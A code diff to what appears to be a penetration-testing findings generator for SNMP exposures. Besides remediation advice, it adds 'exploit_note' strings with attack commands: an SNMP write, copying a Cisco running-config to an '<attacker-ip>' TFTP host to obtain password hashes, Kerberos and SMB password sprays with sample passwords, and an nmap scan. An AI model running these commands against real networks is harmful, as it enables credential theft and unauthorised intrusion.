@@ -656,7 +656,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "Disable SNMP if unused; otherwise move to SNMPv3 (auth+priv) and remove "
                 "default/guessable communities.",
                 ["CWE-1392", "CWE-306", "CWE-319"],
-                kind="snmp_rw" if pr.get("rw_likely") else "snmp_community"))
+                kind="snmp_rw" if pr.get("rw_likely") else "snmp_community",
+                exploit_note=(
+                    "snmpset -v2c -c <community> <ip> 1.3.6.1.2.1.1.4.0 s "
+                    "'recce-canary'; then Cisco: python3 -m pysnmp.tools "
+                    "--config-copy tftp://<attacker-ip>/run.cfg — running-config "
+                    "lands with 'enable secret' hashes."
+                ) if pr.get("rw_likely") else "",
+                depth_tier="t1" if pr.get("rw_likely") else ""))
             if pr.get("users"):
                 names = ", ".join(pr["users"][:15])
                 out.append(_finding(
@@ -667,7 +674,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"snmp-check {ip} -c {pr['community']}   # users under "
                     "1.3.6.1.4.1.77.1.2.25",
                     "Restrict the SNMP view; move to SNMPv3; remove the LanManager MIB "
-                    "exposure.", ["CWE-200"], kind="snmp_users"))
+                    "exposure.", ["CWE-200"], kind="snmp_users",
+                    exploit_note=(
+                        "kerbrute passwordspray -d <domain> --dc <dc> "
+                        "loot/snmp-users.txt 'Winter2024!'; nxc smb <all_hosts> "
+                        "-u loot/snmp-users.txt -p 'Password1' "
+                        "--continue-on-success."
+                    ),
+                    depth_tier="t2"))
             inv = (pr.get("processes") or []) + (pr.get("software") or [])
             if inv:
                 out.append(_finding(
@@ -705,7 +719,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"snmpwalk -v2c -c {pr['community']} {ip} {_ARP_PHYS}",
                     "Restrict the SNMP view so the network tables (RFC1213 ip group) "
                     "are not world-readable; move to SNMPv3.",
-                    ["CWE-200"], kind="snmp_arp"))
+                    ["CWE-200"], kind="snmp_arp",
+                    exploit_note=(
+                        "snmpwalk -v2c -c <community> <ip> "
+                        "1.3.6.1.2.1.4.22.1.2; feed IPs into nmap: "
+                        "nmap -Pn -sS -T4 --top-ports 1000 <fresh_ips>."
+                    ) if fresh else "",
+                    depth_tier="t1" if fresh else ""))
 
             routes = pr.get("routes") or []
             if routes:
